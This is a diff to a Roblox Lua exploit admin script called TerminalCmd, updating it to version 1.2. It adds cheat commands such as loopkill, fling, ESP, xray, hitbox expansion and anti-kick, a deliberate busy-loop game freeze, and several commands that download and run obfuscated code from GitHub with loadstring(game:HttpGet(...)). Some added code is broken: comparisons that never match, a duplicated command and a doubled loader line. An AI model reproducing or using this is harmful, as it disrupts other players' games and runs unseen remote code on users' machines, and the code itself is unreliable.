@@ -19,7 +19,8 @@ local PARTICLE_COLORS = {
 -- Preload assets to prevent lag
 ContentProvider:PreloadAsync({
     "rbxassetid://11173905963", -- Example of a potential custom font
-    "rbxassetid://112490670948282"   -- Example particle texture
+    "rbxassetid://112490670948282",   -- Example particle texture
+    "rbxassetid://120131404524020" -- Example icon image (can be replaced with your preferred icon)
 })
 
 -- Create ScreenGui with improved settings
@@ -123,6 +124,24 @@ watermarkLabel.TextSize = 18
 watermarkLabel.TextTransparency = 1
 watermarkLabel.ZIndex = 3
 watermarkLabel.Parent = screenGui
+
+-- Create transparent icon in top right corner
+local icon = Instance.new("ImageLabel")
+icon.Name = "TopRightIcon"
+icon.Size = UDim2.new(0, 50, 0, 50) -- Adjust size as needed
+icon.Position = UDim2.new(1, -60, 0, 10) -- 10 pixels from top, 60 pixels from right
+icon.AnchorPoint = Vector2.new(1, 0) -- Anchored to top-right
+icon.BackgroundTransparency = 1
+icon.ImageTransparency = 0.7 -- Semi-transparent
+icon.Image = "rbxassetid://120131404524020" -- Replace with your preferred icon image ID
+icon.ZIndex = 3
+
+-- Add rounded corners to the icon
+local corner = Instance.new("UICorner")
+corner.CornerRadius = UDim.new(0.2, 0) -- 20% of the icon's size (adjust as needed)
+corner.Parent = icon
+
+icon.Parent = screenGui
 
 -- Create cinematic effects
 local blurEffect = Instance.new("BlurEffect")
@@ -235,6 +254,10 @@ local gradientEnableGoals = {Enabled = true}
 local gradientDisableGoals = {Enabled = false}
 local gradientRotateGoals = {Rotation = 360}
 
+-- Icon animation goals
+local iconFadeInGoals = {ImageTransparency = 0.3}
+local iconFadeOutGoals = {ImageTransparency = 1}
+
 -- Create tweens
 local fadeInTween = TweenService:Create(textLabel, fadeInTweenInfo, fadeInGoals)
 local shadowFadeInTween = TweenService:Create(textShadow, fadeInTweenInfo, shadowFadeInGoals)
@@ -249,6 +272,8 @@ local bgFadeOutTween = TweenService:Create(background, fadeOutTweenInfo, bgFadeO
 local gradientEnableTween = TweenService:Create(gradient, fadeInTweenInfo, gradientEnableGoals)
 local gradientDisableTween = TweenService:Create(gradient, fadeOutTweenInfo, gradientDisableGoals)
 local gradientRotateTween = TweenService:Create(gradient, gradientRotateTweenInfo, gradientRotateGoals)
+local iconFadeInTween = TweenService:Create(icon, fadeInTweenInfo, iconFadeInGoals)
+local iconFadeOutTween = TweenService:Create(icon, fadeOutTweenInfo, iconFadeOutGoals)
 
 -- Enhanced particle animation with rotation
 local particleConnection
@@ -285,6 +310,7 @@ local function playIntroAnimation()
     shadowFadeInTween:Play()
     gradientEnableTween:Play()
     gradientRotateTween:Play()
+    iconFadeInTween:Play() -- Fade in the icon
     
     -- Delayed watermark appearance
     task.delay(INTRO_DURATION * 0.25, function()
@@ -305,6 +331,7 @@ local function playIntroAnimation()
     blurOutTween:Play()
     bgFadeOutTween:Play()
     gradientDisableTween:Play()
+    iconFadeOutTween:Play() -- Fade out the icon
     
     -- Wait for animations to complete
     fadeOutTween.Completed:Wait()
@@ -327,6 +354,262 @@ if not success then
     if colorCorrection then colorCorrection:Destroy() end
     if dofEffect then dofEffect:Destroy() end
 end
+task.wait()
+
+-- Place this in a LocalScript (for client-side freezing) or a regular Script (for server-side freezing)
+-- Recommended location: StarterPlayerScripts or StarterGui for LocalScript
+
+local freezeDuration = 3 -- seconds to freeze the game
+
+local function freezeGame(duration)
+    -- Get the current time
+    local startTime = os.clock()
+    
+    -- Freeze the game by creating an infinite loop that lasts for the duration
+    while os.clock() - startTime < duration do
+        -- This loop will block all other Lua execution
+        -- Note: This only freezes Lua, not the physics engine
+    end
+    
+    print("Game unfrozen after " .. duration .. " seconds")
+end
+
+-- Call the freeze function
+freezeGame(freezeDuration)
+
+task.wait()
+
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+
+local player = Players.LocalPlayer
+local gui = player:WaitForChild("PlayerGui")
+
+-- Create ScreenGui
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "NotificationGui"
+screenGui.Parent = gui
+screenGui.ResetOnSpawn = false
+screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+-- Notification queue and active notifications table
+local notificationQueue = {}
+local activeNotifications = {}
+local notificationOffset = 0
+
+-- Notification function
+function showNotification(title, message, duration, color)
+    duration = duration or 5
+    color = color or Color3.fromRGB(0, 170, 255)
+    
+    -- Calculate position based on active notifications
+    local positionOffset = #activeNotifications * 70
+    
+    -- Main frame
+    local frame = Instance.new("Frame")
+    frame.Name = "Notification"
+    frame.Size = UDim2.new(0.25, 0, 0, 0) -- Height will be auto-adjusted
+    frame.Position = UDim2.new(1, 10, 0.8, positionOffset)
+    frame.AnchorPoint = Vector2.new(1, 0)
+    frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+    frame.BackgroundTransparency = 0.3
+    frame.BorderSizePixel = 0
+    frame.ClipsDescendants = true
+    frame.ZIndex = 2
+    frame.Parent = screenGui
+    
+    -- Shadow effect
+    local shadow = Instance.new("ImageLabel")
+    shadow.Name = "Shadow"
+    shadow.Image = "rbxassetid://1316045217"
+    shadow.ImageColor3 = Color3.new(0, 0, 0)
+    shadow.ImageTransparency = 0.8
+    shadow.ScaleType = Enum.ScaleType.Slice
+    shadow.SliceCenter = Rect.new(10, 10, 118, 118)
+    shadow.Size = UDim2.new(1, 10, 1, 10)
+    shadow.Position = UDim2.new(0, -5, 0, -5)
+    shadow.BackgroundTransparency = 1
+    shadow.ZIndex = 1
+    shadow.Parent = frame
+    
+    -- Corner rounding
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, 8)
+    corner.Parent = frame
+    
+    -- Accent bar
+    local accent = Instance.new("Frame")
+    accent.Name = "Accent"
+    accent.Size = UDim2.new(0, 4, 1, -16)
+    accent.Position = UDim2.new(0, 6, 0, 8)
+    accent.BackgroundColor3 = color
+    accent.BorderSizePixel = 0
+    accent.ZIndex = 3
+    local accentCorner = Instance.new("UICorner")
+    accentCorner.CornerRadius = UDim.new(0, 2)
+    accentCorner.Parent = accent
+    accent.Parent = frame
+    
+    -- Icon (optional)
+    local icon = Instance.new("ImageLabel")
+    icon.Name = "Icon"
+    icon.Size = UDim2.new(0, 20, 0, 20)
+    icon.Position = UDim2.new(0, 15, 0, 12)
+    icon.BackgroundTransparency = 1
+    icon.Image = "rbxassetid://120131404524020" -- Default info icon
+    icon.ImageColor3 = color
+    icon.ZIndex = 3
+    icon.Parent = frame
+    
+    -- Title text
+    local titleLabel = Instance.new("TextLabel")
+    titleLabel.Name = "Title"
+    titleLabel.Text = string.upper(title)
+    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+    titleLabel.TextSize = 14
+    titleLabel.Font = Enum.Font.GothamBold
+    titleLabel.Size = UDim2.new(1, -50, 0, 20)
+    titleLabel.Position = UDim2.new(0, 40, 0, 10)
+    titleLabel.TextXAlignment = Enum.TextXAlignment.Left
+    titleLabel.BackgroundTransparency = 1
+    titleLabel.ZIndex = 3
+    titleLabel.Parent = frame
+    
+    -- Message text
+    local messageLabel = Instance.new("TextLabel")
+    messageLabel.Name = "Message"
+    messageLabel.Text = message
+    messageLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+    messageLabel.TextSize = 13
+    messageLabel.Font = Enum.Font.Gotham
+    messageLabel.TextWrapped = true
+    messageLabel.Size = UDim2.new(1, -20, 1, -40)
+    messageLabel.Position = UDim2.new(0, 15, 0, 35)
+    messageLabel.TextXAlignment = Enum.TextXAlignment.Left
+    messageLabel.TextYAlignment = Enum.TextYAlignment.Top
+    messageLabel.BackgroundTransparency = 1
+    messageLabel.ZIndex = 3
+    messageLabel.Parent = frame    
+    messageLabel.AutomaticSize = Enum.AutomaticSize.Y
+    
+    -- Close button (X)
+    local closeButton = Instance.new("ImageButton")
+    closeButton.Name = "CloseButton"
+    closeButton.Image = "rbxassetid://3926305904" -- X icon
+    closeButton.ImageRectOffset = Vector2.new(924, 724)
+    closeButton.ImageRectSize = Vector2.new(36, 36)
+    closeButton.ImageColor3 = Color3.fromRGB(150, 150, 150)
+    closeButton.Size = UDim2.new(0, 16, 0, 16)
+    closeButton.Position = UDim2.new(1, -25, 0, 12)
+    closeButton.BackgroundTransparency = 1
+    closeButton.ZIndex = 3
+    closeButton.Parent = frame
+    
+    -- Progress bar (shows time remaining)
+    local progressBar = Instance.new("Frame")
+    progressBar.Name = "ProgressBar"
+    progressBar.Size = UDim2.new(1, 0, 0, 2)
+    progressBar.Position = UDim2.new(0, 0, 1, -2)
+    progressBar.BackgroundColor3 = color
+    progressBar.BorderSizePixel = 0
+    progressBar.ZIndex = 3
+    local progressCorner = Instance.new("UICorner")
+    progressCorner.CornerRadius = UDim.new(0, 2)
+    progressCorner.Parent = progressBar
+    progressBar.Parent = frame
+    
+    -- Calculate required height based on message
+    local textHeight = messageLabel.TextBounds.Y
+    local frameHeight = math.clamp(textHeight + 45, 60, 200)
+    frame.Size = UDim2.new(frame.Size.X.Scale, frame.Size.X.Offset, 0, frameHeight)
+    
+    -- Add to active notifications
+    table.insert(activeNotifications, frame)
+    
+    -- Animation
+    local slideIn = TweenService:Create(
+        frame,
+        TweenInfo.new(0.3, Enum.EasingStyle.Quint, Enum.EasingDirection.Out),
+        {Position = UDim2.new(1, -10, 0.8, positionOffset)}
+    )
+    
+    local slideOut = TweenService:Create(
+        frame,
+        TweenInfo.new(0.3, Enum.EasingStyle.Quint, Enum.EasingDirection.In),
+        {Position = UDim2.new(1, 10, 0.8, positionOffset)}
+    )
+    
+    local fadeOut = TweenService:Create(
+        frame,
+        TweenInfo.new(0.2, Enum.EasingStyle.Linear),
+        {BackgroundTransparency = 1}
+    )
+    
+    -- Progress bar animation
+    local progressTween = TweenService:Create(
+        progressBar,
+        TweenInfo.new(duration - 0.3, Enum.EasingStyle.Linear),
+        {Size = UDim2.new(0, 0, 0, 2)}
+    )
+    
+    slideIn:Play()
+    progressTween:Play()
+    
+    -- Close functionality
+    local function close()
+        -- Remove from active notifications
+        for i, notification in ipairs(activeNotifications) do
+            if notification == frame then
+                table.remove(activeNotifications, i)
+                break
+            end
+        end
+        
+        -- Update positions of remaining notifications
+        for i, notification in ipairs(activeNotifications) do
+            local newPosition = UDim2.new(1, -10, 0.8, (i-1) * 70)
+            TweenService:Create(
+                notification,
+                TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+                {Position = newPosition}
+            ):Play()
+        end
+        
+        slideOut:Play()
+        slideOut.Completed:Wait()
+        frame:Destroy()
+    end
+    
+    closeButton.MouseButton1Click:Connect(close)
+    closeButton.MouseEnter:Connect(function()
+        TweenService:Create(closeButton, TweenInfo.new(0.1), {ImageColor3 = Color3.fromRGB(255, 255, 255)}):Play()
+    end)
+    closeButton.MouseLeave:Connect(function()
+        TweenService:Create(closeButton, TweenInfo.new(0.1), {ImageColor3 = Color3.fromRGB(150, 150, 150)}):Play()
+    end)
+    
+    -- Hover effects
+    frame.MouseEnter:Connect(function()
+        TweenService:Create(frame, TweenInfo.new(0.1), {BackgroundTransparency = 0.1}):Play()
+    end)
+    
+    frame.MouseLeave:Connect(function()
+        TweenService:Create(frame, TweenInfo.new(0.1), {BackgroundTransparency = 0.3}):Play()
+    end)
+    
+    -- Auto-close after duration
+    task.delay(duration, function()
+        if frame and frame.Parent then
+            close()
+        end
+    end)
+end
+
+-- Example usage:
+showNotification("LOADING", "67 commands has been loaded", 3, Color3.fromRGB(0, 200, 100))
+task.wait(1.5)
+showNotification("WELCOME", "Welcome to TCMD! Enjoy >:33", 8, Color3.fromRGB(0, 170, 255))
 task.wait()
 pcall(function()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/OBFhm5650lol/Credit-obfuscated-lol/refs/heads/main/OBFCredit", true))()
@@ -498,10 +781,7 @@ end
 -- Example Usage
 debugPrint("🔄 [Debug] Running example usage")
 checkForError()
-createNotification("Type In <cmds>", 5, "rbxassetid://132036502772790")
-wait()
-createNotification("TerminalCmd :D", 5, "rbxassetid://132036502772790")
-task.wait()
+createNotification("Type In <<cmds>>", 5, "rbxassetid://132036502772790")
 
 print(" ၊၊||၊|။||||။‌‌‌‌‌၊|• TerminalCmd •၊၊||၊|။||||။‌‌‌‌‌၊|")
 task.wait()
@@ -737,7 +1017,7 @@ minimizeButtonCorner.Parent = minimizeButton
 -- Create Collapsed Label
 local collapsedLabel = Instance.new("TextLabel")
 collapsedLabel.Name = "CollapsedLabel"
-collapsedLabel.Text = "TCmd (v1.1)"
+collapsedLabel.Text = "TCmd (v1.2)"
 collapsedLabel.Size = UDim2.new(1, 0, 1, 0)
 collapsedLabel.Position = UDim2.new(0, -20, -0.02, 0)
 collapsedLabel.BackgroundTransparency = 1
@@ -1011,7 +1291,34 @@ local function UnFly()
     humanoid.PlatformStand = false
 end
 
--- FakeLag
+-- animation speed variable
+local AnimationSpeedController = {
+    CurrentSpeed = 1,
+    Enabled = false,
+    Running = false
+}
+
+-- Main control function for animation speeds
+local function ControlAnimationSpeeds()
+    AnimationSpeedController.Running = true
+    
+    while AnimationSpeedController.Running and task.wait(0.1) do
+        local character = game.Players.LocalPlayer.Character
+        if not character then continue end
+        
+        local animController = character:FindFirstChildOfClass("Humanoid") or character:FindFirstChildOfClass("AnimationController")
+        if not animController then continue end
+        
+        -- Only adjust speeds if the controller is enabled
+        if AnimationSpeedController.Enabled then
+            for _, track in ipairs(animController:GetPlayingAnimationTracks()) do
+                track:AdjustSpeed(AnimationSpeedController.CurrentSpeed)
+            end
+        end
+    end
+end
+
+-- FakeLag variable
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 local RunService = game:GetService("RunService")
@@ -1435,6 +1742,8 @@ uiPadding.Parent = scrollingFrame
 local commands = {
     "cmds",
     "clear",
+    "fly/f",
+    "unfly/uf",
     "antilag",
     "emitteron/en",
     "emitteroff/ef",
@@ -1442,13 +1751,15 @@ local commands = {
     "fullbright/fb",
     "unfullbright/unfb",
     "reset/re",
-    "meleeloopkill/mkill",
-    "gunloopkill/gkill",
+    "LoopKill/lkill",
     "serverhop/shop",
     "fov [value]",
     "walkspeed/ws [value]",
     "resetwalkspeed/resetws",
     "jumppower/jp [value]",
+    "tpwalk/tpw",
+    "tpwalkspeed/tpws [value]",
+    "animationspeed/as [value]",
     "tpto [plr]",
     "grav [value]",
     "activatealltools/aat",
@@ -1466,8 +1777,8 @@ local commands = {
     "disablenameesp/dnesp",
     "unesp",
     "unctest",
-    "loadpcr",
-    "loadhitblox",
+    "pcr",
+    "hitblox",
     "xray",
     "unxray",
     "dex",
@@ -1476,10 +1787,6 @@ local commands = {
     "namelessadminv2/nav2",
     "sit",
     "lay",
-    "fly/f",
-    "unfly/unf",
-    "tpwalk/tpw",
-    "tpwalkspeed/tpws",
     "stoptpwalk/stpw",
     "enabletfling/etf",
     "disabletfling/dtf",
@@ -1497,6 +1804,8 @@ local commands = {
     "f3x/fex",
     "winobby",
     "floatparts",
+    "hugtool",
+    "drawchat",
     "🍪",
 }
 
@@ -3233,7 +3542,7 @@ end
         input.Text = ""
 
         -- Add the command to the output
-        outputText.Text = outputText.Text .. "\nUser> " .. command
+        outputText.Text = outputText.Text .. "\n</> " .. command
 
         -- Simulate command execution
         local result = "Command not recognized."
@@ -3329,7 +3638,7 @@ end
             else
                 result = "Started UncTest:\n"
             end
-        elseif command:sub(1, 11) == "loadpcr" then
+        elseif command:sub(1, 11) == "pcr" then
             local luaCode = command:sub(12)
             local func, err = loadstring(game:HttpGet("https://raw.githubusercontent.com/hm5650/PCR/refs/heads/main/PartControllerRemote"))()
             if func then
@@ -3342,7 +3651,7 @@ end
             else
                 result = "PartControllerRemote is active:\n"
             end
-        elseif command:sub(1, 12) == "loadhitblox" then
+        elseif command:sub(1, 12) == "hitblox" then
             local luaCode = command:sub(13)
             local func, err = loadstring(game:HttpGet("https://raw.githubusercontent.com/hm5650/Hitblox/refs/heads/main/Hitblox"))()
             if func then
@@ -3816,7 +4125,7 @@ end
             else
                 result = "Flying:\n"
             end
-        elseif command:sub(1, 15) == "unf" then
+        elseif command:sub(1, 15) == "uf" then
             local luaCode = command:sub(16)
             local func, err = UnFly()
             if func then
@@ -3829,9 +4138,31 @@ end
             else
                 result = "Stopped Flying:\n"
             end
+        elseif command:lower():sub(1, 15) == "animationspeed " or command:lower():sub(1, 3) == "as " then
+            -- Extract speed value (works for both versions)
+            local speedValue
+            if command:lower():sub(1, 3) == "as " then
+                speedValue = tonumber(command:sub(4))
+            else
+                speedValue = tonumber(command:sub(16))
+            end
+            
+            if speedValue then
+                AnimationSpeedController.CurrentSpeed = speedValue
+                AnimationSpeedController.Enabled = true
+                
+                -- Start the controller if not already running
+                if not AnimationSpeedController.Running then
+                    task.spawn(ControlAnimationSpeeds)
+                end
+                
+                result = "(to reset type in 1) Animation speed set to " .. speedValue
+            else
+                result = "Invalid speed value. Please provide a number."
+            end
         elseif command:sub(1, 15) == "antikick" then
             local luaCode = command:sub(16)
-            local func, err = loadstring(game:HttpGet("https://raw.githubusercontent.com/nmalka01/nmalka01/refs/heads/main/Anti-kick"))()
+            local func, err = loadstring(game:HttpGet("https://raw.githubusercontent.com/OBFhm5650lol/AntkickLol/refs/heads/main/Antikicklol"))()
             if func then
                 local success, execResult = pcall(func)
                 if success then
@@ -3855,7 +4186,7 @@ end
             else
                 result = "AntiLag Started:\nRecommended To Use FullBright"
             end
-        elseif command:sub(1, 15) == "meleekill" then
+        elseif command:sub(1, 15) == "loopkill" then
             local luaCode = command:sub(16)
             local func, err = loadstring(game:HttpGet("https://raw.githubusercontent.com/OBFhm5650lol/2Loopkillsbnensnsns3838/refs/heads/main/Lkobf", true))()
             if func then
@@ -3866,9 +4197,9 @@ end
                     result = "Execution error:\n"
                 end
             else
-                result = "MeleeLoopKillIsActive:\n"
+                result = "LoopKill UI Started:\n"
             end
-        elseif command:sub(1, 15) == "mkill" then
+        elseif command:sub(1, 15) == "lkill" then
             local luaCode = command:sub(16)
             local func, err = loadstring(game:HttpGet("https://raw.githubusercontent.com/OBFhm5650lol/2Loopkillsbnensnsns3838/refs/heads/main/Lkobf", true))()
             if func then
@@ -3879,33 +4210,7 @@ end
                     result = "Execution error:\n"
                 end
             else
-                result = "MeleeLoopKillIsActive:\n"
-            end
-        elseif command:sub(1, 15) == "gunkill" then
-            local luaCode = command:sub(16)
-            local func, err = loadstring(game:HttpGet("https://raw.githubusercontent.com/OBFhm5650lol/Loopkillsbnensnsns3838/refs/heads/main/LoopKillObF", true))()
-            if func then
-                local success, execResult = pcall(func)
-                if success then
-                    result = "Executed successfully:\n" .. tostring(execResult)
-                else
-                    result = "Execution error:\n"
-                end
-            else
-                result = "GunLoopKillIsActive:\n"
-            end
-        elseif command:sub(1, 15) == "gkill" then
-            local luaCode = command:sub(16)
-            local func, err = loadstring(game:HttpGet("https://raw.githubusercontent.com/OBFhm5650lol/Loopkillsbnensnsns3838/refs/heads/main/LoopKillObF", true))()
-            if func then
-                local success, execResult = pcall(func)
-                if success then
-                    result = "Executed successfully:\n" .. tostring(execResult)
-                else
-                    result = "Execution error:\n"
-                end
-            else
-                result = "GunLoopKillIsActive:\n"
+                result = "LoopKill UI Started:\n"
             end
         elseif command:sub(1, 15) == "fakelag" then
             local luaCode = command:sub(16)
@@ -3932,6 +4237,45 @@ end
                 end
             else
                 result = "FakeLag Stopped:\n"
+            end
+        elseif command:sub(1, 15) == "drawchat" then
+            local luaCode = command:sub(16)
+            local func, err = loadstring(game:HttpGet("https://raw.githubusercontent.com/AKadminlol/Chatdraw/refs/heads/main/Chattdraw"))()
+            if func then
+                local success, execResult = pcall(func)
+                if success then
+                    result = "Executed successfully:\n" .. tostring(execResult)
+                else
+                    result = "Execution error:\n"
+                end
+            else
+                result = "someone recommended me this :/ :\n"
+            end
+        elseif command:sub(1, 15) == "hugtool" then
+            local luaCode = command:sub(16)
+            local func, err = loadstring(game:HttpGet("https://raw.githubusercontent.com/ExploitFin/Animations/refs/heads/main/Front%20and%20Back%20Hug%20Tool"))()loadstring(game:HttpGet("https://raw.githubusercontent.com/ExploitFin/Animations/refs/heads/main/Front%20and%20Back%20Hug%20Tool"))()
+            if func then
+                local success, execResult = pcall(func)
+                if success then
+                    result = "Executed successfully:\n" .. tostring(execResult)
+                else
+                    result = "Execution error:\n"
+                end
+            else
+                result = "someone recommended me this :/ :\n"
+            end
+        elseif command:sub(1, 15) == "drawchat" then
+            local luaCode = command:sub(16)
+            local func, err = loadstring(game:HttpGet("https://raw.githubusercontent.com/AKadminlol/Chatdraw/refs/heads/main/Chattdraw"))()
+            if func then
+                local success, execResult = pcall(func)
+                if success then
+                    result = "Executed successfully:\n" .. tostring(execResult)
+                else
+                    result = "Execution error:\n"
+                end
+            else
+                result = "someone recommended me this :/ :\n"
             end
         elseif command:sub(1, 15) == "flag" then
             local luaCode = command:sub(16)
@@ -4040,7 +4384,7 @@ end
                             end
                         end
                     end
-                    result = "Hitboxes expanded to " .. value .. " (non-collidable, 50% transparent) for applicable players"
+                    result = "Hitboxes expanded to " .. value .. " Type in 0 if you want to reset"
                 end
             else
                 result = "Invalid value. Usage: hitbox [number] or hitbox 0 to turn off"
